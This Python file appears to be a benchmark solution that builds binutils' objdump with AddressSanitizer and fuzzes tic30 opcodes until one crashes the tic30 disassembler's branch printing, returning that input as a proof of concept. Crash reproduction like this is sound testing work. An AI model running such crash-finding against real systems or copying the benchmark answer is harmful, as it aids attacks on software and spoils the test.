import os
import tarfile
import subprocess
import shutil
import tempfile
import re
import struct
import random
import time
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in tic30-dis.c
        """
        base_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=base_dir)
            
            # Find the actual source root directory (handle tarball structure)
            src_root = base_dir
            for root, dirs, files in os.walk(base_dir):
                if 'configure' in files and 'opcodes' in dirs:
                    src_root = root
                    break
            
            # 2. Compile the vulnerable binary with AddressSanitizer
            build_dir = os.path.join(base_dir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            env = os.environ.copy()
            env['CC'] = 'gcc'
            env['CFLAGS'] = '-g -O0 -fsanitize=address'
            env['LDFLAGS'] = '-fsanitize=address'
            
            # Configure for tic30 target (Texas Instruments C30)
            subprocess.run(
                [os.path.join(src_root, 'configure'), '--target=tic30-unknown-coff', '--disable-nls', '--disable-werror'],
                cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
            
            # Build opcodes and binutils (parallel build)
            subprocess.run(
                ['make', '-j8', 'all-opcodes', 'all-binutils'],
                cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
            
            # Locate the objdump binary
            objdump_bin = os.path.join(build_dir, 'binutils', 'objdump')
            if not os.path.exists(objdump_bin):
                objdump_bin = os.path.join(build_dir, 'binutils', 'objdump.exe')
                
            # 3. Extract seeds (opcodes) from source code heuristics
            seeds = set()
            files_to_scan = []
            files_to_scan.extend(glob.glob(os.path.join(src_root, 'opcodes', '*tic30*.c')))
            files_to_scan.extend(glob.glob(os.path.join(src_root, 'include', 'opcode', '*tic30*.h')))
            
            for fpath in files_to_scan:
                if not os.path.exists(fpath): continue
                with open(fpath, 'r', errors='ignore') as f:
                    content = f.read()
                    # Find hex constants that look like 32-bit opcodes
                    for m in re.finditer(r'0x[0-9a-fA-F]+', content):
                        try:
                            val = int(m.group(0), 16)
                            if 0x10000000 <= val <= 0xFFFFFFFF:
                                seeds.add(val)
                        except: pass
            
            seed_list = list(seeds)
            # Add known branch opcodes for TIC30 if not found (0x60000000 is BR)
            if not seed_list:
                seed_list = [0x60000000, 0x61000000, 0x62000000, 0x63000000, 0x64000000]
            
            # Prioritize seeds that start with 0x6 (Branch instructions in C30)
            seed_list.sort(key=lambda x: 0 if (x & 0xF0000000) == 0x60000000 else 1)

            # Helper function to check if a payload crashes objdump
            def check_payload(data):
                with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tf:
                    tf.write(data)
                    tf_name = tf.name
                try:
                    # Run objdump on the binary input
                    res = subprocess.run(
                        [objdump_bin, '-D', '-b', 'binary', '-m', 'tic30', tf_name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=2
                    )
                    # Check for crash (ASAN error or segfault)
                    if res.returncode != 0:
                        err = res.stderr.decode('utf-8', errors='ignore')
                        if "AddressSanitizer" in err or res.returncode == -11 or res.returncode == 139:
                            return True
                    return False
                except:
                    return False
                finally:
                    if os.path.exists(tf_name):
                        os.unlink(tf_name)

            # 4. Fuzzing Loop
            # Phase 1: Check seeds directly (Big Endian)
            for seed in seed_list[:200]:
                payload = struct.pack('>I', seed)
                if check_payload(payload):
                    return payload

            # Phase 2: Random fuzzing around seeds
            start_time = time.time()
            # Run for up to 60 seconds
            while time.time() - start_time < 60:
                batch_candidates = []
                batch_data = b""
                
                # Create a batch of 200 instructions to test at once
                for _ in range(200):
                    s = random.choice(seed_list) if seed_list else 0x60000000
                    
                    # C30 opcodes are 32-bit.
                    # The vulnerability is in print_branch, likely triggered by specific operand addressing modes.
                    # Fuzz the lower 24 bits where operands are defined.
                    
                    if random.random() < 0.2:
                        val = random.getrandbits(32) # Pure random
                    else:
                        # Mutation based on seed
                        val = (s & 0xFF000000) | random.getrandbits(24)
                    
                    batch_candidates.append(val)
                    batch_data += struct.pack('>I', val)
                
                if check_payload(batch_data):
                    # Batch crashed, bisect to find the exact crashing instruction
                    for val in batch_candidates:
                        # Try Big Endian
                        payload = struct.pack('>I', val)
                        if check_payload(payload):
                            return payload
                        # Try Little Endian
                        payload_le = struct.pack('<I', val)
                        if check_payload(payload_le):
                            return payload_le
                    
                    # If we couldn't isolate it (context dependent?), return a small chunk
                    return batch_data[:10]
            
            # Fallback if no crash found
            return b"\x60\x00\x00\x00"

        except Exception:
            # Fallback on error
            return b"\x60\x00\x00\x00"
        finally:
            shutil.rmtree(base_dir, ignore_errors=True)